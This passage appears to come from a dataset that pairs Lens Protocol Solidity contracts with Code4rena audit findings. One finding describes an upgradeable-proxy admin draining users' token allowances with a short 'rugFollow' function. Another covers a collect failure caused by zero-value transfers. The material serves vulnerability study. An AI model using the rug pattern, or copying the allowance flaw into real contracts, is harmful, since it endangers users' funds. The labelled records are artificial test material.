'\\x19\\x01',\n                    _calculateDomainSeparator(),\n                    keccak256(\n                        abi.encode(\n                            COLLECT_WITH_SIG_TYPEHASH,\n                            vars.profileId,\n                            vars.pubId,\n                            keccak256(vars.data),\n                            sigNonces[vars.collector]++,\n                            vars.sig.deadline\n                        )\n                    )\n                )\n            );\n        }\n\n        _validateRecoveredAddress(digest, vars.collector, vars.sig);\n        InteractionLogic.collect(\n            vars.collector,\n            vars.profileId,\n            vars.pubId,\n            vars.data,\n            COLLECT_NFT_IMPL,\n            _pubByIdByProfile,\n            _profileById\n        );\n    }\n\n    /// @inheritdoc ILensHub\n    function emitFollowNFTTransferEvent(\n        uint256 profileId,\n        uint256 followNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedFollowNFT = _profileById[profileId].followNFT;\n        if (msg.sender != expectedFollowNFT) revert Errors.CallerNotFollowNFT();\n        emit Events.FollowNFTTransferred(profileId, followNFTId, from, to, block.timestamp);\n    }\n\n    /// @inheritdoc ILensHub\n    function emitCollectNFTTransferEvent(\n        uint256 profileId,\n        uint256 pubId,\n        uint256 collectNFTId,\n        address from,\n        address to\n    ) external override {\n        address expectedCollectNFT = _pubByIdByProfile[profileId][pubId].collectNFT;\n        if (msg.sender != expectedCollectNFT) revert Errors.CallerNotCollectNFT();\n        emit Events.CollectNFTTransferred(\n            profileId,\n            pubId,\n            collectNFTId,\n            from,\n            to,\n            block.timestamp\n        );\n    }\n\n    /// *********************************\n    /// *****EXTERNAL VIEW FUNCTIONS*****\n    /// *********************************\n\n    /// @inheritdoc ILensHub\n    function isProfileCreatorWhitelisted(address profileCreator)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _profileCreatorWhitelisted[profileCreator];\n    }\n\n    /// @inheritdoc ILensHub\n    function isFollowModuleWhitelisted(address followModule) external view override returns (bool) {\n        return _followModuleWhitelisted[followModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isReferenceModuleWhitelisted(address referenceModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _referenceModuleWhitelisted[referenceModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function isCollectModuleWhitelisted(address collectModule)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return _collectModuleWhitelisted[collectModule];\n    }\n\n    /// @inheritdoc ILensHub\n    function getGovernance() external view override returns (address) {\n        return _governance;\n    }\n\n    /// @inheritdoc ILensHub\n    function getDispatcher(uint256 profileId) external view override returns (address) {\n        return _dispatcherByProfile[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubCount(uint256 profileId) external view override returns (uint256) {\n        return _profileById[profileId].pubCount;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFT(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowNFTURI(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].followNFTURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectNFT(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectNFT;\n    }\n\n    /// @inheritdoc ILensHub\n    function getFollowModule(uint256 profileId) external view override returns (address) {\n        return _profileById[profileId].followModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getCollectModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].collectModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getReferenceModule(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (address)\n    {\n        return _pubByIdByProfile[profileId][pubId].referenceModule;\n    }\n\n    /// @inheritdoc ILensHub\n    function getHandle(uint256 profileId) external view override returns (string memory) {\n        return _profileById[profileId].handle;\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubPointer(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (uint256, uint256)\n    {\n        uint256 profileIdPointed = _pubByIdByProfile[profileId][pubId].profileIdPointed;\n        uint256 pubIdPointed = _pubByIdByProfile[profileId][pubId].pubIdPointed;\n        return (profileIdPointed, pubIdPointed);\n    }\n\n    /// @inheritdoc ILensHub\n    function getContentURI(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (string memory)\n    {\n        (uint256 rootProfileId, uint256 rootPubId, ) = Helpers.getPointedIfMirror(\n            profileId,\n            pubId,\n            _pubByIdByProfile\n        );\n        return _pubByIdByProfile[rootProfileId][rootPubId].contentURI;\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfileIdByHandle(string calldata handle) external view override returns (uint256) {\n        bytes32 handleHash = keccak256(bytes(handle));\n        return _profileIdByHandleHash[handleHash];\n    }\n\n    /// @inheritdoc ILensHub\n    function getProfile(uint256 profileId)\n        external\n        view\n        override\n        returns (DataTypes.ProfileStruct memory)\n    {\n        return _profileById[profileId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPub(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PublicationStruct memory)\n    {\n        return _pubByIdByProfile[profileId][pubId];\n    }\n\n    /// @inheritdoc ILensHub\n    function getPubType(uint256 profileId, uint256 pubId)\n        external\n        view\n        override\n        returns (DataTypes.PubType)\n    {\n        if (pubId == 0 || _profileById[profileId].pubCount < pubId) {\n            return DataTypes.PubType.Nonexistent;\n        } else if (_pubByIdByProfile[profileId][pubId].collectModule == address(0)) {\n            return DataTypes.PubType.Mirror;\n        } else {\n            if (_pubByIdByProfile[profileId][pubId].profileIdPointed == 0) {\n                return DataTypes.PubType.Post;\n            } else {\n                return DataTypes.PubType.Comment;\n            }\n        }\n    }\n\n    /**\n     * @dev Overrides the ERC721 tokenURI function to return the associated URI with a given profile.\n     */\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        return _profileById[tokenId].imageURI; // temp\n    }\n\n    /// ****************************\n    /// *****INTERNAL FUNCTIONS*****\n    /// ****************************\n\n    function _setGovernance(address newGovernance) internal {\n        address prevGovernance = _governance;\n        _governance = newGovernance;\n        emit Events.GovernanceSet(msg.sender, prevGovernance, newGovernance, block.timestamp);\n    }\n\n    function _createPost(\n        uint256 profileId,\n        string memory contentURI,\n        address collectModule,\n        bytes memory collectModuleData,\n        address referenceModule,\n        bytes memory referenceModuleData\n    ) internal {\n        PublishingLogic.createPost(\n            profileId,\n            contentURI,\n            collectModule,\n            collectModuleData,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _createComment(DataTypes.CommentData memory vars) internal {\n        PublishingLogic.createComment(\n            vars,\n            _profileById[vars.profileId].pubCount + 1,\n            _profileById,\n            _pubByIdByProfile,\n            _collectModuleWhitelisted,\n            _referenceModuleWhitelisted\n        );\n        _profileById[vars.profileId].pubCount++;\n    }\n\n    function _createMirror(\n        uint256 profileId,\n        uint256 profileIdPointed,\n        uint256 pubIdPointed,\n        address referenceModule,\n        bytes calldata referenceModuleData\n    ) internal {\n        PublishingLogic.createMirror(\n            profileId,\n            profileIdPointed,\n            pubIdPointed,\n            referenceModule,\n            referenceModuleData,\n            ++_profileById[profileId].pubCount,\n            _pubByIdByProfile,\n            _referenceModuleWhitelisted\n        );\n    }\n\n    function _setDispatcher(uint256 profileId, address dispatcher) internal {\n        _dispatcherByProfile[profileId] = dispatcher;\n        emit Events.DispatcherSet(profileId, dispatcher, block.timestamp);\n    }\n\n    function _setProfileImageURI(uint256 profileId, string memory imageURI) internal {\n        _profileById[profileId].imageURI = imageURI;\n        emit Events.ProfileImageURISet(profileId, imageURI, block.timestamp);\n    }\n\n    function _setFollowNFTURI(uint256 profileId, string memory followNFTURI) internal {\n        _profileById[profileId].followNFTURI = followNFTURI;\n        emit Events.FollowNFTURISet(profileId, followNFTURI, block.timestamp);\n    }\n\n    function _clearHandleHash(uint256 profileId) internal {\n        bytes32 handleHash = keccak256(bytes(_profileById[profileId].handle));\n        _profileIdByHandleHash[handleHash] = 0;\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        if (_dispatcherByProfile[tokenId] != address(0)) {\n            _setDispatcher(tokenId, address(0));\n        }\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function _validateCallerIsProfileOwnerOrDispatcher(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId) && msg.sender != _dispatcherByProfile[profileId])\n            revert Errors.NotProfileOwnerOrDispatcher();\n    }\n\n    function _validateCallerIsProfileOwner(uint256 profileId) internal view {\n        if (msg.sender != ownerOf(profileId)) revert Errors.NotProfileOwner();\n    }\n\n    function _validateCallerIsGovernance() internal view {\n        if (msg.sender != _governance) revert Errors.NotGovernance();\n    }\n\n    function _validateCallerIsWhitelistedProfileCreator() internal view {\n        if (!_profileCreatorWhitelisted[msg.sender]) revert Errors.ProfileCreatorNotWhitelisted();\n    }\n\n    function getRevision() internal pure virtual override returns (uint256) {\n        return REVISION;\n    }\n}\n\n\n",
        "CodeNames": [
            "FeeModuleBase.sol",
            "CollectNFT.sol",
            "ERC721Enumerable.sol",
            "FollowNFT.sol",
            "ApprovalFollowModule.sol",
            "ERC721Time.sol",
            "LensHub.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-06",
                "Location": [
                    "//solidity\nfunction processFollow(\n    address follower,\n    uint256 profileId,\n    bytes calldata data\n) external override onlyHub {\n    uint256 amount = _dataByProfile[profileId].amount;\n    address currency = _dataByProfile[profileId].currency;\n    _validateDataIsExpected(data, currency, amount);\n\n    (address treasury, uint16 treasuryFee) = _treasuryData();\n    address recipient = _dataByProfile[profileId].recipient;\n    uint256 treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n    uint256 adjustedAmount = amount treasuryAmount;\n\n    IERC20(currency).safeTransferFrom(follower, recipient, adjustedAmount);\n    IERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n}\n",
                    "//solidity\nfunction rugFollow(address follower, address followModule, uint256 profileId, bytes calldata data)\n    external\n{\n    IFollowModule(followModule).processFollow(\n        follower,\n        profileIds,\n        data\n    );\n}\n"
                ],
                "Type": " Imprecise management of users' allowance allows the admin of the upgradeable proxy contract to rug users",
                "Description": "\nIn the current implementation, when there is a fee on follow or collect, users need to approve to the follow modules or collect module contract, and then the Hub contract can call processFollow() and transfer funds from an arbitrary address (as the follower parameter).\n\nFeeFollowModule.sol#L75-L91(https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/follow/FeeFollowModule.sol#L75-L91)<br\n\nsolidity\nfunction processFollow(\n    address follower,\n    uint256 profileId,\n    bytes calldata data\n) external override onlyHub {\n    uint256 amount = _dataByProfile[profileId].amount;\n    address currency = _dataByProfile[profileId].currency;\n    _validateDataIsExpected(data, currency, amount);\n\n    (address treasury, uint16 treasuryFee) = _treasuryData();\n    address recipient = _dataByProfile[profileId].recipient;\n    uint256 treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n    uint256 adjustedAmount = amount treasuryAmount;\n\n    IERC20(currency).safeTransferFrom(follower, recipient, adjustedAmount);\n    IERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n}\n\n\nA common practice is asking users to approve an unlimited amount to the contracts. Normally, the allowance can only be used by the user who initiated the transaction.\n\nIt's not a problem as long as transferFrom will always only transfer funds from msg.sender and the contract is non-upgradable.\n\nHowever, the LensHub contract is upgradeable, and FeeFollowModule will transferFrom an address decided by an input parameter follower, use of upgradeable proxy contract structure allows the logic of the contract to be arbitrarily changed.\n\nThis allows the proxy admin to perform many malicious actions, including taking funds from users' wallets up to the allowance limit.\n\nThis action can be performed by the malicious/compromised proxy admin without any restriction.\n\n\nGiven:\n\n*   profileId 1 uses FeeCollectModule with currency = WETH and amount = 1e18\n*   Alice is rich (with 1,000,000 WETH in wallet balance)\n\n1.  Alice approve() type(uint256).max to FeeCollectModule and follow() profileId 1 with 1e18 WETH;\n2.  A malicious/compromised proxy admin can call upgradeToAndCall() on the proxy contract and set a malicious contract as newImplementation, adding a new functions:\n\nsolidity\nfunction rugFollow(address follower, address followModule, uint256 profileId, bytes calldata data)\n    external\n{\n    IFollowModule(followModule).processFollow(\n        follower,\n        profileIds,\n        data\n    );\n}\n\n\n3.  The attacker creates a new profile with FeeCollectModule and set currency = WETH and amount = 1,000,000, got profileId = 2\n4.  The attacker rugFollow() with follower = Alice, profileId = 2, stolen 1,000,000 WETH from Alice's wallet\n\n",
                "Repair": "\nImproper management of users' allowance is the root cause of some of the biggest attacks in the history of DeFi security. We believe there are 2 rules that should be followed:\n\n1.  the from of transferFrom should always be msg.sender;\n2.  the contracts that hold users' allowance should always be non-upgradable.\n\nWe suggest adding a non-upgradeable contract for processing user payments:\n\nsolidity\nfunction followWithFee(uint256 profileId, bytes calldata data)\n    external\n{\n    (address currency, uint256 amount) = abi.decode(data, (address, uint256));\n    IERC20(currency).transferFrom(msg.sender, HUB, amount);\n\n    uint256[] memory profileIds = new uint256[(1);\n    profileIds[0] = profileId;\n\n    bytes[] memory datas = new bytes[(1);\n    datas[0] = data;\n\n    IHUB(HUB).follow(profileIds, datas);\n}\n\n\nThis comes with an additional benefit: users only need to approve one contract instead of approving multiple follow or collect module contracts.\n\nZer0dot (Aave Lens) acknowledged, but disagreed with High severity and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1072751986):\n  This is true, but is within the acceptable risk model. \n\n0xleastwood (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1117928564):\n  While I agree with the warden, this assumes that the admin acts maliciously. As such, I think medium risk is more in line with a faulty governance.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1125575438):\n  I still relatively disagree with severity, as with M-03 (Issue #26)(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26) faulty governance is an acceptable risk parameter. Though we should have been more clear that this is the case! \n\n0xleastwood (judge) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/68#issuecomment-1125811742):\n  I agree with you fully here, but again it comes down to the judging guidelines which might change in the future. The stated attack vector has stated assumptions which leads to a loss of funds.\n \n \n 2 \u2014 Med (M): vulns have a risk of 2 and are considered \u201cMedium\u201d severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n \n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ICollectModule} from '../../../interfaces/ICollectModule.sol';\nimport {Errors} from '../../../libraries/Errors.sol';\nimport {FeeModuleBase} from '../FeeModuleBase.sol';\nimport {ModuleBase} from '../ModuleBase.sol';\nimport {FollowValidationModuleBase} from '../FollowValidationModuleBase.sol';\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport {SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\n\n/**\n * @notice A struct containing the necessary data to execute collect actions on a publication.\n *\n * @param amount The collecting cost associated with this publication.\n * @param recipient The recipient address associated with this publication.\n * @param currency The currency associated with this publication.\n * @param referralFee The referral fee associated with this publication.\n */\nstruct ProfilePublicationData {\n    uint256 amount;\n    address recipient;\n    address currency;\n    uint16 referralFee;\n}\n\n/**\n * @title FeeCollectModule\n * @author Lens Protocol\n *\n * @notice This is a simple Lens CollectModule implementation, inheriting from the ICollectModule interface and\n * the FeeCollectModuleBase abstract contract.\n *\n * This module works by allowing unlimited collects for a publication at a given price.\n */\ncontract FeeCollectModule is ICollectModule, FeeModuleBase, FollowValidationModuleBase {\n    using SafeERC20 for IERC20;\n\n    mapping(uint256 => mapping(uint256 => ProfilePublicationData))\n        internal _dataByPublicationByProfile;\n\n    constructor(address hub, address moduleGlobals) FeeModuleBase(moduleGlobals) ModuleBase(hub) {}\n\n    /**\n     * @notice This collect module levies a fee on collects and supports referrals. Thus, we need to decode data.\n     *\n     * @param profileId The token ID of the profile of the publisher, passed by the hub.\n     * @param pubId The publication ID of the newly created publication, passed by the hub.\n     * @param data The arbitrary data parameter, decoded into:\n     *      uint256 amount: The currency total amount to levy.\n     *      address currency: The currency address, must be internally whitelisted.\n     *      address recipient: The custom recipient address to direct earnings to.\n     *      uint16 referralFee: The referral fee to set.\n     *\n     * @return An abi encoded bytes parameter, which is the same as the passed data parameter.\n     */\n    function initializePublicationCollectModule(\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external override onlyHub returns (bytes memory) {\n        (uint256 amount, address currency, address recipient, uint16 referralFee) = abi.decode(\n            data,\n            (uint256, address, address, uint16)\n        );\n        if (\n            !_currencyWhitelisted(currency) ||\n            recipient == address(0) ||\n            referralFee > BPS_MAX ||\n            amount < BPS_MAX\n        ) revert Errors.InitParamsInvalid();\n\n        _dataByPublicationByProfile[profileId][pubId].referralFee = referralFee;\n        _dataByPublicationByProfile[profileId][pubId].recipient = recipient;\n        _dataByPublicationByProfile[profileId][pubId].currency = currency;\n        _dataByPublicationByProfile[profileId][pubId].amount = amount;\n\n        return data;\n    }\n\n    /**\n     * @dev Processes a collect by:\n     *  1. Ensuring the collector is a follower\n     *  2. Charging a fee\n     */\n    function processCollect(\n        uint256 referrerProfileId,\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) external virtual override onlyHub {\n        _checkFollowValidity(profileId, collector);\n        if (referrerProfileId == profileId) {\n            _processCollect(collector, profileId, pubId, data);\n        } else {\n            _processCollectWithReferral(referrerProfileId, collector, profileId, pubId, data);\n        }\n    }\n\n    /**\n     * @notice Returns the publication data for a given publication, or an empty struct if that publication was not\n     * initialized with this module.\n     *\n     * @param profileId The token ID of the profile mapped to the publication to query.\n     * @param pubId The publication ID of the publication to query.\n     *\n     * @return The ProfilePublicationData struct mapped to that publication.\n     */\n    function getPublicationData(uint256 profileId, uint256 pubId)\n        external\n        view\n        returns (ProfilePublicationData memory)\n    {\n        return _dataByPublicationByProfile[profileId][pubId];\n    }\n\n    function _processCollect(\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) internal {\n        uint256 amount = _dataByPublicationByProfile[profileId][pubId].amount;\n        address currency = _dataByPublicationByProfile[profileId][pubId].currency;\n        _validateDataIsExpected(data, currency, amount);\n\n        (address treasury, uint16 treasuryFee) = _treasuryData();\n        address recipient = _dataByPublicationByProfile[profileId][pubId].recipient;\n        uint256 treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n        uint256 adjustedAmount = amount - treasuryAmount;\n\n        IERC20(currency).safeTransferFrom(collector, recipient, adjustedAmount);\n        IERC20(currency).safeTransferFrom(collector, treasury, treasuryAmount);\n    }\n\n    function _processCollectWithReferral(\n        uint256 referrerProfileId,\n        address collector,\n        uint256 profileId,\n        uint256 pubId,\n        bytes calldata data\n    ) internal {\n        uint256 amount = _dataByPublicationByProfile[profileId][pubId].amount;\n        address currency = _dataByPublicationByProfile[profileId][pubId].currency;\n        _validateDataIsExpected(data, currency, amount);\n\n        uint256 referralFee = _dataByPublicationByProfile[profileId][pubId].referralFee;\n        address treasury;\n        uint256 treasuryAmount;\n\n        // Avoids stack too deep\n        {\n            uint16 treasuryFee;\n            (treasury, treasuryFee) = _treasuryData();\n            treasuryAmount = (amount * treasuryFee) / BPS_MAX;\n        }\n\n        uint256 adjustedAmount = amount - treasuryAmount;\n\n        if (referralFee != 0) {\n            // The reason we levy the referral fee on the adjusted amount is so that referral fees\n            // don't bypass the treasury fee, in essence referrals pay their fair share to the treasury.\n            uint256 referralAmount = (adjustedAmount * referralFee) / BPS_MAX;\n            adjustedAmount = adjustedAmount - referralAmount;\n\n            address referralRecipient = IERC721(HUB).ownerOf(referrerProfileId);\n\n            IERC20(currency).safeTransferFrom(collector, referralRecipient, referralAmount);\n        }\n        address recipient = _dataByPublicationByProfile[profileId][pubId].recipient;\n\n        IERC20(currency).safeTransferFrom(collector, recipient, adjustedAmount);\n        IERC20(currency).safeTransferFrom(collector, treasury, treasuryAmount);\n    }\n}\n\n\n",
        "CodeNames": [
            "FeeCollectModule.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-09",
                "Location": [
                    "treasuryAmount"
                ],
                "Type": " Collect modules can fail on zero amount transfers if treasury fee is set to zero",
                "Description": "\nTreasury fee can be zero, while collect modules do attempt to send it in such a case anyway as there is no check in place. Some ERC20 tokens do not allow zero value transfers, reverting such attempts.\n\nThis way, a combination of zero treasury fee and such a token set as a collect fee currency will revert any collect operations, rendering collect functionality unavailable\n\n\nTreasury fee can be set to zero:\n\nModuleGlobals.sol#L109(https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/ModuleGlobals.sol#L109)<br\n\nTreasury fee transfer attempts are now done uncoditionally in all the collect modules.\n\nNamely, FeeCollectModule, LimitedFeeCollectModule, TimedFeeCollectModule and LimitedTimedFeeCollectModule do not check the treasury fee to be send, treasuryAmount, before transferring:\n\nFeeCollectModule.sol#L176(https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L176)<br\n\nLimitedFeeCollectModule.sol#L194(https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedFeeCollectModule.sol#L194)<br\n\nTimedFeeCollectModule.sol#L190(https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/TimedFeeCollectModule.sol#L190)<br\n\nLimitedTimedFeeCollectModule.sol#L205(https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L205)<br\n\nThe same happens in the FeeFollowModule:\n\nFeeFollowModule.sol#L90(https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/follow/FeeFollowModule.sol#L90)\n\n\nSome ERC20 tokens revert on zero value transfers:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers\n\n",
                "Repair": "\nConsider checking the treasury fee amount and do transfer only when it is positive.\n\nNow:\n\n    IERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n\nTo be:\n\n    if (treasuryAmount  0)\n    \tIERC20(currency).safeTransferFrom(follower, treasury, treasuryAmount);\n\ndonosonaumczuk (Aave Lens) confirmed and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075347095):\n  This one makes sense to me.\n cc: @Zer0dot \n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075414219):\n  I think it makes sense, will add!\n\nZer0dot (Aave Lens) resolved and commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/62#issuecomment-1075438824):\n  Addressed in aave/lens-protocol#77(https://github.com/aave/lens-protocol/pull/77).\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {ICollectNFT} from '../interfaces/ICollectNFT.sol';\nimport {ILensHub} from '../interfaces/ILensHub.sol';\nimport {Errors} from '../libraries/Errors.sol';\nimport {Events} from '../libraries/Events.sol';\nimport {LensNFTBase} from './base/LensNFTBase.sol';\n\n/**\n * @title CollectNFT\n * @author Lens Protocol\n *\n * @notice This is the NFT contract that is minted upon collecting a given publication. It is cloned upon\n * the first collect for a given publication, and the token URI points to the original publication's contentURI.\n */\ncontract CollectNFT is ICollectNFT, LensNFTBase {\n    address public immutable HUB;\n\n    uint256 internal _profileId;\n    uint256 internal _pubId;\n    uint256 internal _tokenIdCounter;\n\n    bool private _initialized;\n\n    // We create the CollectNFT with the pre-computed HUB address before deploying the hub proxy in order\n    // to initialize the hub proxy at construction.\n    constructor(address hub) {\n        HUB = hub;\n    }\n\n    /// @inheritdoc ICollectNFT\n    function initialize(\n        uint256 profileId,\n        uint256 pubId,\n        string calldata name,\n        string calldata symbol\n    ) external override {\n        if (_initialized) revert Errors.Initialized();\n        _initialized = true;\n        _profileId = profileId;\n        _pubId = pubId;\n        super._initialize(name, symbol);\n        emit Events.CollectNFTInitialized(profileId, pubId, block.timestamp);\n    }\n\n    /// @inheritdoc ICollectNFT\n    function mint(address to) external override {\n        if (msg.sender != HUB) revert Errors.NotHub();\n        uint256 tokenId = ++_tokenIdCounter;\n        _mint(to, tokenId);\n    }\n\n    /// @inheritdoc ICollectNFT\n    function getSourcePublicationPointer() external view override returns (uint256, uint256) {\n        return (_profileId, _pubId);\n    }\n\n    function tokenURI(uint256 tokenId) public view override returns (string memory) {\n        if (!_exists(tokenId)) revert Errors.TokenDoesNotExist();\n        return ILensHub(HUB).getContentURI(_profileId, _pubId);\n    }\n\n    /**\n     * @dev Upon transfers, we emit the transfer event in the hub.\n     */\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 tokenId\n    ) internal override {\n        super._beforeTokenTransfer(from, to, tokenId);\n        ILensHub(HUB).emitCollectNFTTransferEvent(_profileId, _pubId, tokenId, from, to);\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\n\npragma solidity 0.8.10;\n\nimport {IFollowModule} from '../../../interfaces/IFollowModule.sol';\nimport {Errors} from '../../../libraries/Errors.sol';\nimport {Events} from '../../../libraries/Events.sol';\nimport {ModuleBase} from '../ModuleBase.sol';\nimport {FollowValidatorFollowModuleBase} from './FollowValidatorFollowModuleBase.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\n\n/**\n * @title ApprovalFollowModule\n * @author Lens Protocol\n *\n * @notice This follow module only allows addresses that are approved for a profile by the profile owner to follow.\n */\ncontract ApprovalFollowModule is IFollowModule, FollowValidatorFollowModuleBase {\n    // We use a triple nested mapping so that, on profile transfer, the previous approved address list is invalid;\n    mapping(address => mapping(uint256 => mapping(address => bool)))\n        internal _approvedByProfileByOwner;\n\n    constructor(address hub) ModuleBase(hub) {}\n\n    /**\n     * @notice A custom function that allows profile owners to customize approved addresses.\n     *\n     * @param profileId The profile ID to approve/disapprove follower addresses for.\n     * @param addresses The addresses to approve/disapprove for following the profile.\n     * @param toApprove Whether to approve or disapprove the addresses for following the profile.\n     */\n    function approve(\n        uint256 profileId,\n        address[] calldata addresses,\n        bool[] calldata toApprove\n    ) external {\n        if (addresses.length != toApprove.length) revert Errors.InitParamsInvalid();\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (msg.sender != owner) revert Errors.NotProfileOwner();\n\n        for (uint256 i = 0; i < addresses.length; ++i) {\n            _approvedByProfileByOwner[owner][profileId][addresses[i]] = toApprove[i];\n        }\n\n        emit Events.FollowsApproved(owner, profileId, addresses, toApprove, block.timestamp);\n    }\n\n    /**\n     * @notice This follow module works on custom profile owner approvals.\n     *\n     * @param data The arbitrary data parameter, decoded into:\n     *      address[] addresses: The array of addresses to approve initially.\n     *\n     * @return An abi encoded bytes parameter, which is the same as the passed data parameter.\n     */\n    function initializeFollowModule(uint256 profileId, bytes calldata data)\n        external\n        override\n        onlyHub\n        returns (bytes memory)\n    {\n        address owner = IERC721(HUB).ownerOf(profileId);\n\n        if (data.length > 0) {\n            address[] memory addresses = abi.decode(data, (address[]));\n            for (uint256 i = 0; i < addresses.length; ++i) {\n                _approvedByProfileByOwner[owner][profileId][addresses[i]] = true;\n            }\n        }\n        return data;\n    }\n\n    /**\n     * @dev Processes a follow by:\n     *  1. Validating that the follower has been approved for that profile by the profile owner\n     */\n    function processFollow(\n        address follower,\n        uint256 profileId,\n        bytes calldata data\n    ) external override onlyHub {\n        address owner = IERC721(HUB).ownerOf(profileId);\n        if (!_approvedByProfileByOwner[owner][profileId][follower])\n            revert Errors.FollowNotApproved();\n        _approvedByProfileByOwner[owner][profileId][follower] = false; // prevents repeat follows\n    }\n\n    /**\n     * @dev We don't need to execute any additional logic on transfers in this follow module.\n     */\n    function followModuleTransferHook(\n        uint256 profileId,\n        address from,\n        address to,\n        uint256 followNFTTokenId\n    ) external override {}\n\n    /**\n     * @notice Returns whether the given address is approved for the profile owned by a given address.\n     *\n     * @param profileOwner The profile owner of the profile to query the approval with.\n     * @param profileId The token ID of the profile to query approval with.\n     * @param toCheck The address to query approval for.\n     *\n     * @return\n     */\n    function isApproved(\n        address profileOwner,\n        uint256 profileId,\n        address toCheck\n    ) external view returns (bool) {\n        return _approvedByProfileByOwner[profileOwner][profileId][toCheck];\n    }\n\n    /**\n     * @notice Returns whether the given addresses are approved for the profile owned by a given address.\n     *\n     * @param profileOwner The profile owner of the profile to query the approvals with.\n     * @param profileId The token ID of the profile to query approvals with.\n     * @param toCheck The address array to query approvals for.\n     */\n    function isApprovedArray(\n        address profileOwner,\n        uint256 profileId,\n        address[] calldata toCheck\n    ) external view returns (bool[] memory) {\n        bool[] memory approved = new bool[](toCheck.length);\n        for (uint256 i = 0; i < toCheck.length; ++i) {\n            approved[i] = _approvedByProfileByOwner[profileOwner][profileId][toCheck[i]];\n        }\n        return approved;\n    }\n}\n\n\n",
        "CodeNames": [
            "CollectNFT.sol",
            "ApprovalFollowModule.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "M-11",
                "Location": [
                    "profileId",
                    "approve"
                ],
                "Type": " Approvals not cleared when transferring profile",
